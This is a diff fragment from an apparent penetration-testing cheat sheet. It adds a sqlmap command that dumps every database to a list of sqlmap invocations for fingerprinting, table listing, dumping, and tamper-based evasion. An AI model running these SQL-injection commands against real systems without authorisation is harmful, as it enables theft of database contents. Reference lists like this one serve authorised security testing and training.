@@ -155,6 +155,7 @@
 * `sqlmap -r req.txt --banner --current-user --current-db --is-dba`
 * `sqlmap -r req.txt --tables -D <DB-Name>`
 * `sqlmap -r req.txt -D <DB-Name> -T <Table-Name> --batch --dump`
+* `sqlmap -r req.txt --batch --dump-all`
 * `sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>
 
 ### Prefix/Suffix
